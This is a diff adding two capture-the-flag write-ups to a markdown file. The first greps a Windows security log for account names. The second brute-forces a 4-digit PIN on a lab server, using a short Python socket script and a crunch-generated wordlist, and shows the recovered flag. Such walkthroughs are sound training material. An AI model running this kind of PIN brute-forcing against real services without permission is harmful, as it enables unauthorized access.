@@ -154,3 +154,80 @@ I tried to use the MD5 file hash as a flag and this happened to work as a correc
 │   ├── Its a shame really  (10)
 |   └── Swiftly (10)
 ```
+
+# 1. A thin pane of glass (10)
+
+#### Description :
+``A windows machine was compromised. We think it was related to credential reuse. But not sure whose account. Any ways, my eyes hurt scrolling through this log.``
+#### Files :
+``SecLog.csv``
+
+Yet another kinda basic one, We are provided with a large `.csv` and are supposed to find the account which caused the trouble.
+I download the file and view it using `cat` but since the challenge only mentions that it needs to find the user account I am going to grep for them using ``"Account Name"`` as my grepping string :
+
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# cat SecLog.csv | grep "Account Name"
+[...]
+Account Name : robberte
+Account Name : jrock
+Account Name : bubbles
+Account Name : MrLehey
+```
+All four of them might be a possible correct flag so I tried all four of them...
+
+#### Flag : ``MrLehey``
+
+
+
+# 2. Its a shame really  (10)
+
+#### Description :
+``We had to let one our sysadmins go. They may have been leaking data. We suspect this server, challenges.ctfd.io:30129, was used but can't seem to get in. Can you help us get in?``
+
+I first connected to the remote server using `netcat` to somehow find out whats the deal with the challenge : 
+![nc](url)
+
+The remote server asks for a 4-digit pin as seen in the above screenshot and probably compares it with it's correct pin. I smell bruteforcing , do you smell that too..?
+
+Seems like automating the whole thing in a small python script would be cool and helpful.
+
+```python
+import socket
+import sys
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('challenges.ctfd.io', 30129))
+
+for i in open('pin.txt', 'r'):
+
+        print s.recv(1024)
+        s.send(i)
+        print(i)
+```
+
+The script above makes a connection with the remote server and tries to input the strings found in pin.txt.
+To make that fully complete I am going to also generate a wordlist of all possible 4-digit numeric pins using crunch :
+
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# crunch 4 4 0123456789 -o pin.txt    
+Crunch will now generate the following amount of data: 50000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 10000 
+
+crunch: 100% completed generating output
+```
+
+And execute the script by grepping to flag string , so I can catch the flag when the correct pin is inputed :
+
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# python exploit.py | grep flag 
+flag{usedthebruteforce}
+```
+
+#### FLAG : ``usedthebruteforce``
